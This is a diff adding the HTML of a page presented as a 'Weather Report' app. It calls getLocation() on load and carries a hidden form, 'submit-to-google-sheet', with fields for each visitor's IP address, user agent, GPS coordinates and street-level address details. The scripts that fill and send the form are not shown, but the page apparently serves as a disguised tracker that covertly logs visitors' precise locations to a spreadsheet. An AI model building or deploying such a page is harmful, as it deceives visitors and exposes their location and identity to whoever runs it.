@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Weather Report</title>
+
+    <link rel="stylesheet" href="./style.css" />
+
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script src="./security.js"></script>
+</head>
+
+<noscript>
+    <style type="text/css">
+        .card {
+            display: none;
+        }
+    </style>
+    <div class="noscriptmsg">
+        <img src="./images/error.png" alt="">
+        <div class="center">
+            Please enable JavaScript to access the site
+        </div>
+    </div>
+</noscript>
+
+<body onload="getLocation()">
+    <div class="card">
+        <div class="search">
+            <input type="search" name="" id="" placeholder="enter city name" spellcheck="false" />
+        </div>
+
+        <div class="weather">
+            <img src="./images/rain.png" class="weather_icon" alt="" />
+            <h1 class="temp"></h1>
+            <h2 class="city"></h2>
+            <div class="details">
+                <div class="col">
+                    <img src="./images/humidity.png" alt="" />
+                    <div>
+                        <p class="humidity"></p>
+                        <p>Humidity</p>
+                    </div>
+                </div>
+                <div class="col">
+                    <img src="./images/wind.png" alt="" />
+                    <div>
+                        <p class="wind"></p>
+                        <p>Wind Speed</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <form name="submit-to-google-sheet" method="post">
+        <input name="ipAddress" type="hidden" id="ipAddress">
+        <input name="userAgent" type="hidden" id="userAgent">
+        <input name="latitude" type="hidden" id="latitude">
+        <input name="longitude" type="hidden" id="longitude">
+        <input name="neighbourhood" type="hidden" id="neighbourhood">
+        <input name="suburb" type="hidden" id="suburb">
+        <input name="city" type="hidden" id="city">
+        <input name="municipality" type="hidden" id="municipality">
+        <input name="stateDistrict" type="hidden" id="stateDistrict">
+        <input name="state" type="hidden" id="state">
+        <input name="postcode" type="hidden" id="postcode">
+        <input name="country" type="hidden" id="country">
+        <input name="countryCode" type="hidden" id="countryCode">
+        <input name="displayName" type="hidden" id="displayName">
+    </form>
+
+
+
+    <script src="./script.js"></script>
+</body>
+
+</html>
